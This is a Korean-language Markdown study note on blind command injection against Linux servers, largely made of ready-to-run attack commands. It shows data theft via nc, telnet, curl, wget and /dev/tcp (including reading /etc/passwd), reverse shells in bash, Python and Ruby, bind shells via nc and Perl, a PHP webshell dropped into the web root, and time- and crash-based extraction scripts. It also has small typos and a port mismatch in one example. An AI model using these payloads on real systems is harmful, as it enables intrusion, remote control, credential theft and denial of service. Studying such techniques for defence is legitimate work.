# Command Injection for Linux

## 실행 결과를 확인할 수 없는 환경
Command Injection 취약점이 발생하지만 실행한 명령어의 결과가 보여지지 않을 때의 상황에서 활용할 수 있는 공격 방법

<br/>

### 네트워크의 인/아웃 바운드의 제한이 없을 때 사용할 수 있는 방법
* **Network Outboud**: 삽입할 명령줄에 네트워크 도구를 함께 실행해 자신의 서버에 명령어 실행 결과를 전송함
    - 네트워크 도구를 서버에 설치할 수 있거나 설치되었을 때 사용 가능한 방법들이 해당됨
    - 네트워크를 통해 명령어의 실행 결과를 전송하는 방법
        | 방법 | 설명 |
        |---|----|
        | nc(netcat) | TCP 또는 UDP 프로토콜을 사용하는 네트워크에서 데이터를 송수신하는 프로그램 <br/> &nbsp;&nbsp; - 셸에서 제공하는 파이프와 함께 사용하여 앞서 실행한 명령어의 결과를 네트워크로 전송할 수 있음 |
        | telnet | 네트워크 연결에 사용되는 프로토콜(클라이언트를 설치해 네트워크에 연결을 시도할 수 있음) <br/> &nbsp;&nbsp; - 파이프와 함께 사용하여 앞서 실행한 명령어의 결과를 네트워크로 전송할 수 있음 |
        | CURL/WGET | 웹 서버의 컨텐츠를 가져오는 프로그램 <br/> &nbsp;&nbsp; - 웹 서버에서 컨텐츠를 가져오기 위해 서버를 방문할 때 접속 로그가 남게 되는 특징을 이용해 명령어의 실행 결과를 웹 서버의 경로 또는 Body와 같은 영역에 포함해 전송함 |
        | /dev/tcp & /dev/udp | Bash에서 지원하는 기능으로 네트워크에 연결하는 방법 <br/> &nbsp;&nbsp; - ```/dev/tcp``` 또는 ```/dev/udp``` 장치 경로의 하위 디렉터리로 IP 주소와 포트 번호(```/dev/tcp/127.0.0.1/8000```)를 입력하면 Bash는 해당 경로로 네트워크 연결을 시도하는 특징을 이용해 출력을 ```>``` 문자로 재지정하여 해당 경로로 명령어의 샐행 결과를 전송할 수 있음 |
        + 예시
            ```
            # /etc/passwd 파일의 출력 결과를 127.0.0.1의 8000번 포트로 전송
            cat /etc/passwd | nc 127.0.0.1 8000
            cat /etc/passwd | telent 127.0.0.1 8000

            # CURL을 이용하여 ls -al의 결과(디렉터리 목록)를 네트워크(127.0.0.1의 8000번 포트)로 전송함
            curl "http://127.0.0.1:8000/?$(ls -al|base64 -w0)" # 실행 결과의 개행을 제거하기 위해 base64로 인코딩하여 전달함

            # CURL, WGET을 이용하여 ls -al의 결과(디렉터리 목록)를 Post Body에 포함해 요청을 보냄
            curl http://127.0.0.1:8000/ -d "$(ls-al)"
            wget http://127.0.0.1:8000 --method=POST --body-data="`ls -al`"

            # /dev/를 이용하여 /etc/passwd 파일의 출력 결과를 127.0.0.1의 8000번 포트로 전송
            cat /etc/passwd > /dev/tcp/127.0.0.1/8000
            ```

<br/>

* **Reverse & Bind Shell**: 임의로 실행할 명령어를 네트워크를 통해 입력하고, 실행 결과를 출력해 공격하는 기법
    - 리버스 셸(Reverse Shell): 공격 대상 서버에서 공격자의 서버로 셸을 연결하는 것
        + 리버스 셸을 이용해 명령어의 샐행 결과를 전송하는 방법
            | 방법 | 설명 |
            |---|------|
            | **sh & Bash** | ```/dev/tcp``` 또는 ```/dev/udp``` 경로를 사용해 포트를 서비스하는 서버에 공격 대상의 서버를 실행시킬 수 있음 <br/> &nbsp;&nbsp; - 경로에 입력한 IP 주소를 가진 서버에서 특정 포트를 열고 기다린 후 명령어를 실행하면 셸을 획득할 수 있음 |
            | **언어 사용** | 명령줄에서 코드를 작성해 실행할 수 있는 파이썬, 루비 등의 언어를 이용하여 명령줄에서 소켓을 사용해 리버스 셸 공격을 수행함 |
            - sh&bash를 이용한 리버스 셸 예시
                + 공격 대상 서버(victim)
                    ```
                    /bin/sh -i >& 
                    /dev/tcp/127.0.0.1/8000 0>&1
                    /bin/sh -i >&
                    /dev/udp/127.0.0.1/8000 0>&1
                    ```
                + 공격자 서버(attacker)
                    ```
                    nc -l -p 8080 -k -v
                    /* 명령어 실행 결과: 127.0.0.1를 가진 공격자 서버는 8000번 포트를 열고 연결을 기다리고 있음(공격 전에 미리 준비)
                    Listening on [0.0.0.0] (family 0, port 8080)
                    Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42202)
                    */

                    id
                    /* 명령어 실행 결과 - 셸을 획득할 수 있음
                    uid=1000(aaa) gid=1000(aaa) groups=1000(aaa)
                    */
                    ```
            - 언어를 이용한 리버스 셸 예시 (명령줄에 해당 코드를 입력함)
                + 파이썬
                    ```python
                    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
                    ```
                + 루비
                    ```Ruby
                    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8000");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
                    ```
    - 바인드 셸(Bind Shell): 공격 대상 서버에서 특정 포트를 열어 셸을 서비스하는 것
        + 바인드 셸을 통해 명령어의 실행 결과를 전송하는 방법
            | 방법 | 설명 |
            |---|------|
            | **nc(netcat)** | 버전에 따라 특정 포트에 임의 서비스를 등록할 수 있도록 제공하는 ```-e``` 옵션을 이용해 포트를 열고 ```/bin/sh```를 실행시킴 |
            | **언어 사용** | 펄(Perl) 스크립트를 작성해서 특정 포트를 셸(```/bin/bash```)과 함께 바인딩할 수 있음 |
            - nc를 이용한 바인드 셸 예시
                ```
                # 공격 대상 서버에서 8000번 포트를 열고 /bin/bash를 실행하는 명령어
                nc -nlvp 8000 -e /bin/bash
                ncat -nvlp 8000 -e /bin/bash
                ```
            - ```/bin/bash```와 함께 포트를 바인딩하는 펄 스크립트 예시
                ```perl
                perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
                ```

<br/>

* **파일 생성**: 애플리케이션 상에서 직접 확인할 수 있는 파일 시스템 경로에 명령어의 실행 결과를 저장한 파일을 생성하는 방법
    - 파일을 통해 명령어의 실행 결과를 보는 방법
        | 방법 | 설명 |
        |---|------|
        | **Script Engine** | *Command Injection 취약점이 발생하고, 웹 서버가 지정한 경로를 알고 있으면* 해당 위치에 셸을 실행하는 웹셸(Webshell) 파일을 업로드한 후 해당 페이지에 접속해 셸을 실행하여 그 결과를 확인함 <br/> &nbsp;&nbsp; - 웹 서버가 지정된 경로에 존재하는 파일을 브라우저에 표시한다는 점을 이용함 <br/> &nbsp;&nbsp; - PHP, JSP, ASP 등 웹 서버가 해석 가능한 파일을 만들어 접근할 수 있음 |
        | **Static File Directory** | Static File Directory에 실행한 명령어의 결과를 파일로 생성하고, 해당 파일에 접근해 그 결과를 확인함 <br/> &nbsp;&nbsp; - Static File Directory: 프레임워크 또는 웹 애플리케이션에서 JS/CSS/img 등의 정적 리소스를 다루기 위해 사용함 <br/> &nbsp;&nbsp;&nbsp; - Static File Directory에 파일 생성 권한이 있어야 공격이 가능함 |
        + Script Engine을 이용해 webshell을 등록하는 명령어 예시와 그 실행 결과
            ```php
            printf '<?=system($_GET[0])?>' > /var/www/html/uploads/shell.php
            ```
            - ```접속 경로/uploads/shell.php?0=id```를 브라우저에서 방문하면 id 명령어의 실행 결과를 확인할 수 있음
        + Static File Directory(```static```)를 이용한 실행 결과 확인 방법 예시 (파이썬 Flask 프레임워크)
            ```linux
            mkdir static; id > static/result.txt
            ```
            - 해당 디렉터리를 사용하지 않는 환경에서도 static 디렉토리를 생성하고 파일을 생성하면 그 결과를 확인할 수 있음 → static 디렉터리를 생성하고, ```id``` 명령어의 실행 결과를 result.txt에 저장하고 있음(```static/result.txt``` 페이지를 방문하면 실행 결과 확인 가능)

<br/><br/>

### 네트워크의 인/아웃 바운드의 제한이 걸려 있는 상황에서 참/거짓 비교문으로 데이터를 알아내는 방법
공격 대상 서버에서 네트워크 방화벽 규칙을 설정해 인/아웃 바운드에 제한이 걸려 있는 경우 셸을 이용한 공격은 불가능함 → 참/거짓 비교문으로 데이터를 알아내야 함

<br/>

* 지연 시간(sleep): 비교하는 값이 참일 경우 ```sleep``` 명령어를 실행해 지연 시간을 발생시켜 웹 애플리케이션에서 반환하는 속도를 이용하여 데이터를 획득하는 방법
    - 명령어의 결과를 base64로 인코딩한 값을 한 바이트씩 비교하여 지연 발생 여부(참/거짓)을 통해 데이터를 알아냄
        1. 명령어의 결과를 base64로 인코딩함
            ```
            id
            /* id 명령어 실행 결과
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
            */

            id | base64 -w 0
            /* id 명령어 실행 결과를 base64로 인코딩한 결과
            dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
            */
            ```
        2. 인코딩하여 나온 값을 한 바이트씩 비교하는 Bash 스크립트를 작성하여 참이면 ```sleep``` 명령어를 실행하고, 아니라면 스크립트를 종료해 지연 시간 발생 여부로 데이터를 알아냄
            ```bash
            bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then sleep 2; fi;" # 결과: 2초 지연 발생 (true) → 첫번째 문자 d
            bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then sleep 2; fi;" # 결과: 2초 지연 발생(true) → 두번째 문자 W
            bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then sleep 2; fi;" # 결과: 지연 발생 X (false)
            bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then sleep 2; fi;" # 결과: 2초 지연 발생(true) → 세번째 문자 l
            ```

<br/>

* 에러 (DoS): 비교하는 값이 참일 경우에 시스템 에러(Internal Server Error, HTTP 500)을 발생시켜 에러 반환 여부를 통해 데이터를 획득하는 방법
    - 시간을 지연시키는 방법이 불가능하거나 지연을 확인하기 어려운 경우에 사용할 수 있음
        + 메모리를 많이 소모하는 명령어를 입력하는 등의 행위로 **Internal Server Error**를 발생시켜 참과 거짓을 판별함
            - 메모리를 소모하는 방법은 다양하지만 제일 간단한 방법으로 ```cat /dev/urandom``` 명령어를 실행시켜 할당된 메모리를 초과했다는 에러를 발생시킴
    - 명령어의 결과를 base64로 인코딩한 값을 한 바이트씩 비교하여 Internal Server Error 발생 여부(참/거짓)를 통해 데이터를 알아냄
        1. 명령어의 결과를 base64로 인코딩함 (위의 과정과 동일)
        2. 인코딩하여 나온 값을 한 바이트씩 비교하는 Bash 스크립트를 작성해 500(Internal Server Error, 서버 측 에러)이라면 참, 200(Success, 성공) 등이라면 거짓으로 판단함
            ```bash
            bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (첫번째 문자 d)
            bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (두번째 문자 W)
            bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then cat /dev/urandom; fi;" # 결과: 200(성공) → false
            bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (세번재 문자 l)
            ```

<br/><br/><br/>
